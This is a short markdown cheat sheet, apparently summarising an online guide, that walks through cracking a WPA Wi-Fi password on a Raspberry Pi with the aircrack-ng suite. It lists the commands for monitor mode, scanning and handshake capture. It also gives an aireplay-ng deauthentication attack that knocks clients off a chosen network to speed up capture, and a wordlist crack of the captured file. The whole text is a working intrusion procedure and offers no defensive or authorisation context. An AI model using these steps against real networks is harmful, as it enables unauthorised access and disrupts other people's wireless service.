# TL;DR

> See guide here: https://www.thepolyglotdeveloper.com/2018/06/crack-wireless-passwords-raspberry-pi-aircrack/

1. First, identify attached network devices on the Pi:
    ```sh
    $ sudo airmon-ng
    ```
2. Pick the correct network device (should be the built-in one, probably `wlan0`.
3. Start the network device in monitoring mode:
    ```sh
    $ airmon-ng start wlan0
    ```
4. A new network interface should then be created: `wlan0mon`
5. Scan for nearby networks:
    ```sh
    $ airodump-ng wlan0mon
    ```
6. If the above command doesn't run or the BSSID values are not accurate, you may need to update the IEEE OUI file:
    ```sh
    $ airodump-ng-oui-update
    ```
7. Start monitoring data for a particular network and wait for a WPA handshake, note the BSSID and channel values from the scanned results:
    ```sh
    $ airodump-ng --bssid XX:XX:XX:XX:XX --channel X --write data wlan0mon
    ```
8. Wait for a WPA handshake to appear in the upper corner of the Terminal, run the following in a separate Terminal session to speed things up:
    ```sh
    $ aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX wlan0mon
    ```
9. Once a WPA handshake appears in the `airodump-ng` process, terminate the process (as well as the `aireplay-ng` one if applicable)
10. Note that some files are saved in the current working directory
11. Begin cracking the password, ensure you have a word list to use:
    ```sh
    $ aircrack-ng data-01.cap -w ./<word_list.txt>
    ```
